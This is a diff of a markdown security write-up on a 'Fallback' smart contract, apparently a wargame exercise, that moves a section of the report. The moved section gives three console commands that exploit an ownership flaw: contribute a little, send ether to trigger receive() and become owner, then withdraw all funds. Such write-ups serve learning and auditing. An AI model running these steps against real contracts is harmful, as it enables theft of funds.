@@ -4,6 +4,23 @@
 ## Summary
 The Fallback contract contains an **ownership takeover vulnerability**. An attacker with a minimal contribution can bypass the ownership logic in `contribute()` by using the `receive()` function and become the owner, allowing them to withdraw all contract funds.
 
+## How to audit on fallback level via console interaction
+
+```js
+await contract.contribute({value: toWei("0.0002")})
+contract.sendTransaction({value: toWei("0.003")})
+contract.withdraw()
+```
+
+1. `await contract.contribute({value: toWei("0.0002")})`
+   This function deposits **0.0002 ether** to the contract by converting ether → wei (the EVM unit). 
+
+2. `contract.sendTransaction({value: toWei("0.003")})`
+   This sends **0.003 ether** directly to the contract address. If the contract has a `receive()`/fallback, that function will automatically run and accept the 0.003 ether.
+
+3. `contract.withdraw()`
+   This calls the contract’s withdraw function and — if the caller is the `owner` (i.e., you have already gained ownership) — it will transfer the contract’s entire balance to the owner.
+
 ## Vulnerability Details
 - **Functions affected:** `contribute()`, `receive()`  
 - **Type:** Ownership hijack / access control bypass  
@@ -43,25 +60,6 @@ require(contributions[msg.sender] > contributions[owner]);
 ```
 
 * Or remove ownership assignment from `receive()` entirely and rely on `contribute()` for ownership changes.
-
-## How to audit on fallback level via console interaction
-
-```js
-await contract.contribute({value: toWei("0.0002")})
-contract.sendTransaction({value: toWei("0.003")})
-contract.withdraw()
-```
-
-1. `await contract.contribute({value: toWei("0.0002")})`
-   This function deposits **0.0002 ether** to the contract by converting ether → wei (the EVM unit). 
-
-2. `contract.sendTransaction({value: toWei("0.003")})`
-   This sends **0.003 ether** directly to the contract address. If the contract has a `receive()`/fallback, that function will automatically run and accept the 0.003 ether.
-
-3. `contract.withdraw()`
-   This calls the contract’s withdraw function and — if the caller is the `owner` (i.e., you have already gained ownership) — it will transfer the contract’s entire balance to the owner.
-
-
 ---
 
 **Notes:**
